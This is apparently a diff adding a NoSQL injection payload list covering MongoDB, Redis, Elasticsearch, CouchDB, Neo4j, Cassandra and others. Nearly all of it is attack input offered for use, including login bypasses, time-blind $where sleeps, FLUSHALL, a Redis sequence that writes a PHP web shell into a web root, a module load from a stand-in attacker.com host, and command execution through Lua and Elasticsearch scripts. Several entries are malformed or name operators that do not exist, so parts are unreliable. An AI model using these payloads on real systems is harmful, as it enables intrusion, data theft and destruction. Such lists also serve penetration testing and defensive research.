@@ -1,0 +1,336 @@
+# NoSQL Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: NoSQL Injection (MongoDB, Redis, etc.)
+
+# ============================================
+# MONGODB - BASIC INJECTION
+# ============================================
+
+# Authentication bypass
+admin'||
+'1'=='1
+admin'||
+'1'=='1'/*
+admin'//
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or '1'='1'//
+
+# Always true
+' or true--
+' or 1=1--
+' or '1'='1
+' or 'a'='a
+
+# Username bypass
+username[$ne]=admin
+username[$regex]=.*
+username[$gt]=
+
+# Password bypass
+password[$ne]=test
+password[$regex]=.*
+password[$gt]=
+
+# ============================================
+# MONGODB - OPERATORS
+# ============================================
+
+# Not equal
+{"username": {"$ne": "admin"}}
+{"username": {"$ne": ""}}
+{"password": {"$ne": ""}}
+
+# Greater than/Less than
+{"username": {"$gt": ""}}
+{"password": {"$gt": ""}}
+{"username": {"$lt": "z"}}
+
+# Regex
+{"username": {"$regex": "^admin"}}
+{"username": {"$regex": ".*"}}
+{"username": {"$regex": ""}}
+{"username": {"$options": "i", "$regex": "adm"}}
+
+# In/Nin
+{"role": {"$in": ["admin", "root"]}}
+{"role": {"$nin": ["user"]}}
+
+# Exists
+{"username": {"$exists": true}}
+{"admin": {"$exists": false}}
+
+# Type
+{"username": {"$type": 2}}
+{"password": {"$type": 2}}
+
+# All
+{"roles": {"$all": ["admin", "root"]}}
+
+# ============================================
+# MONGODB - TIME-BLIND
+# ============================================
+
+# Sleep injection (if vulnerable)
+{"username": "admin", "$where": "sleep(5000)"}
+{"$function": function() { sleep(5000); return true; }}
+{"$where": "this.password.match(/.*/) && sleep(5000)"}
+
+# ============================================
+# MONGODB - RCE
+# ============================================
+
+# $where operator
+{"$where": "function(){ return db.version(); }"}
+{"$where": "this.username=='admin' && function(){return true;}()"}
+
+# db.getSiblingDB
+{"$where": "db.getSiblingDB('admin').getCollection('users').find({})"}
+
+# MapReduce
+{"$map": {"input": "users", "as": "user", "in": {"$function": {"body": "return db.getCollection('system.commands').find({}).toArray()", "args": []}}}}
+
+# ============================================
+# MONGODB - DATA EXFILTRATION
+# ============================================
+
+# Using like
+{"username": {"$regex": "^ad", "$options": "i"}}
+
+# Using substring
+{"username": {"$regex": ".*dm.*"}}
+
+# Using in
+{"role": {"$in": ["admin", "superuser", "root"]}}
+
+# ============================================
+# REDIS - INJECTION
+# ============================================
+
+# Basic command injection
+test
+eval
+exec
+
+# Flush all
+flushall
+flushdb
+
+# Config rewrite
+CONFIG SET dir /tmp
+CONFIG SET dbfilename exp.so
+
+# Keyspace notification
+KEYS *
+GET *
+
+# Module loading
+MODULE LOAD /tmp/exp.so
+MODULE LIST
+
+# ============================================
+# REDIS - RCE
+# ============================================
+
+# Via Lua
+eval 'return io.popen("id"):read("*a")' 0
+
+# Via module
+MODULE LOAD /tmp/exp.so
+MODULE LOAD http://attacker.com/exp.so
+
+# Via config
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET foo "<?php system($_GET['cmd']); ?>"
+BGSAVE
+
+# ============================================
+# REDIS - TIME-BASED
+# ============================================
+
+# Sleep
+DEBUG SLEEP 5
+CLIENT PAUSE 5000
+
+# ============================================
+# REDIS - SSRF
+# ============================================
+
+# Gopher protocol
+gopher://127.0.0.1:6379/_FLUSHALL
+
+# ============================================
+# ELASTICSEARCH - INJECTION
+# ============================================
+
+# Query injection
+{"query": {"match_all": {}}}
+{"query": {"match": {"*": "*"}}}
+{"query": {"wildcard": {"*": "*"}}}
+
+# RCE
+{"query": {"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}}
+
+# ============================================
+# COUCHDB - INJECTION
+# ============================================
+
+# Admin access
+{"users": [{"_id": "org.couchdb.user:admin", "name": "admin", "password": "password", "roles": ["_admin"]}]}
+
+# Via _users endpoint
+PUT /_users/org.couchdb.user:admin
+{"_id": "org.couchdb.user:admin", "name": "admin", "password": "password", "roles": ["_admin"]}
+
+# ============================================
+# NEO4J - INJECTION
+# ============================================
+
+# Cypher injection
+a' RETURN 1 as r--
+a' MATCH (n) RETURN n--
+a' MATCH (n:User) WHERE n.name = 'admin' RETURN n--
+
+# ============================================
+# MONGODB - JSON PAYLOAD VARIATIONS
+# ============================================
+
+{"username": {"$eq": "admin"}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"$or": [{"username": "admin"}, {"username": "root"}]}
+{"$and": [{"username": "admin"}, {"password": "password"}]}
+{"$nor": [{"role": "user"}]}
+
+# ============================================
+# MONGODB - BLIND INJECTION
+# ============================================
+
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ad"}}
+{"username": "admin", "password": {"$regex": "^adm"}}
+{"username": "admin", "password": {"$regex": "^admi"}}
+
+# Time-based
+{"$where": "sleep(1000)"}
+{"$function": function() { sleep(1000); return true; }}
+
+# ============================================
+# MONGODB - OBJECTID MANIPULATION
+# ============================================
+
+{"_id": {"$gt": ""}}
+{"_id": {"$oid": "000000000000000000000001"}}
+{"_id": ObjectId("000000000000000000000001")}
+
+# ============================================
+# CASSANDRA - INJECTION
+# ============================================
+
+# CQL injection
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+SELECT * FROM users WHERE username = 'admin'-- AND password = '';
+
+# ============================================
+# MARIADB/MYSQL - NOSQL-STYLE
+# ============================================
+
+# In JSON columns
+{"data": {"$regex": ".*"}}
+{"data": {"$ne": null}}
+{"data": {"$gt": ""}}
+
+# ============================================
+# POSTGRESQL - JSONB
+# ============================================
+
+# JSONB operators
+{"data": {"->": "field"}}
+{"data": {"#>": ["field1", "field2"]}}
+{"data": {"?": "key"}}
+{"data": {"?|": ["key1", "key2"]}
+{"data": {"?&": ["key1", "key2"]}
+
+# ============================================
+# MEMCACHED - INJECTION
+# ============================================
+
+# Get
+get user:1
+get admin
+
+# Set
+set user 0 3600 5
+admin
+
+# Stats
+stats
+stats items
+
+# ============================================
+# MONGODB - AGGREGATION PIPELINE
+# ============================================
+
+{"$lookup": {"from": "users", "localField": "username", "foreignField": "username", "as": "users"}}
+
+# ============================================
+# MONGODB - LOGICAL OPERATORS
+# ============================================
+
+{"$and": [{"a": 1}, {"b": 2}]}
+{"$or": [{"a": 1}, {"b": 2}]}
+{"$nor": [{"a": 1}]}
+{"$not": {"$gt": 10}}
+
+# ============================================
+# MONGODB - SIZE OPERATOR
+# ============================================
+
+{"username": {"$size": 5}}
+{"tags": {"$size": {"$gt": 3}}}
+
+# ============================================
+# MONGODB - ELEMENT OPERATORS
+# ============================================
+
+{"field": {"$exists": true}}
+{"field": {"$exists": false}}
+{"field": {"$type": "string"}}
+{"field": {"$type": 2}}
+
+# ============================================
+# REDIS - PROTOCOL
+# ============================================
+
+*2
+$3
+GET
+$4
+test
+
+# ============================================
+# MONGODB - UNION INJECTION
+# ============================================
+
+{"$union": [{"$collection": "users"}]}
+
+# ============================================
+# MONGODB - ARRAY OPERATORS
+# ============================================
+
+{"tags": {"$in": ["admin", "root"]}}
+{"tags": {"$nin": ["user"]}}
+{"tags": {"$all": ["admin", "root"]}}
+{"tags.0": "admin"}
+{"tags": {"$elemMatch": {"$eq": "admin"}}}
+
+# ============================================
+# MONGODB - COMMENTS
+# ============================================
+
+username=admin//
+username=admin--
+username=admin/*
+username=admin
+
